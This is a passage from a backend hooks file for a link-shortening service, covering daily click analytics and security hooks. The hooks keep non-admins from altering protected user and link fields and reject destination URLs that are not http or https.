            // Extracts 'YYYY-MM-DD' from 'YYYY-MM-DD HH:MM:SS.SSSZ'
            const createdStr = e.record.get("created") || new Date().toISOString();
            const day = createdStr.split(" ")[0].split("T")[0] + " 00:00:00.000Z"; 
            
            $app.db().newQuery(`
                INSERT INTO analytics_daily (id, link_id, day, count, created, updated)
                VALUES (lower(hex(randomblob(7))) || 'a', {:linkId}, {:day}, 1, datetime('now'), datetime('now'))
                ON CONFLICT(link_id, day) DO UPDATE SET count = count + 1, updated = datetime('now')
            `).bind({ linkId: linkId, day: day }).execute();
        }
    } catch (err) {
        $app.logger().error("Critical error incrementing clicks_count for link_id " + e.record.get("link_id") + ": " + err);
    }
    e.next();
}, "clicks");

// ==========================================
// SECURITY HOOKS (Patches for God Mode, Parasite, XSS)
// ==========================================

// God Mode Patch: Prevent non-admins from changing protected user fields
onRecordUpdateRequest((e) => {
    const isAdmin = e.httpContext && e.httpContext.get("admin") !== null;
    if (!isAdmin) {
        const original = e.record.original();
        if (original) {
            const protectedFields = ["role", "plan", "plan_expires_at", "stripe_customer_id", "stripe_subscription_id"];
            for (let i = 0; i < protectedFields.length; i++) {
                const field = protectedFields[i];
                if (e.record.get(field) !== original.get(field)) {
                    e.record.set(field, original.get(field));
                }
            }
        }
    }
    e.next();
}, "users");

// Parasite Patch: Prevent non-admins from changing system link fields
onRecordUpdateRequest((e) => {
    const isAdmin = e.httpContext && e.httpContext.get("admin") !== null;
    if (!isAdmin) {
        const original = e.record.original();
        if (original) {
            const protectedFields = ["system_route_active", "system_route_override", "clicks_count"];
            for (let i = 0; i < protectedFields.length; i++) {
                const field = protectedFields[i];
                if (e.record.get(field) !== original.get(field)) {
                    e.record.set(field, original.get(field));
                }
            }
        }
    }
    
    // XSS Patch: Validate destination URL
    const destUrl = e.record.get("destination_url");
    if (destUrl && !destUrl.startsWith("http://") && !destUrl.startsWith("https://")) {
        throw new BadRequestError("destination_url must start with http:// or https://");
    }
    e.next();
}, "links");

// Parasite & XSS Patch for Link Creation
onRecordCreateRequest((e) => {
    const isAdmin = e.httpContext && e.httpContext.get("admin") !== null;
    if (!isAdmin) {
        e.record.set("system_route_active", false);
        e.record.set("system_route_override", "");
        e.record.set("clicks_count", 0);
    }
    
    // XSS Patch: Validate destination URL
    const destUrl = e.record.get("destination_url");
    if (destUrl && !destUrl.startsWith("http://") && !destUrl.startsWith("https://")) {
        throw new BadRequestError("destination_url must start with http:// or https://");
    }
    e.next();
}, "links");

console.log("--- main.pb.js LOADED SUCCESSFULLY ---");
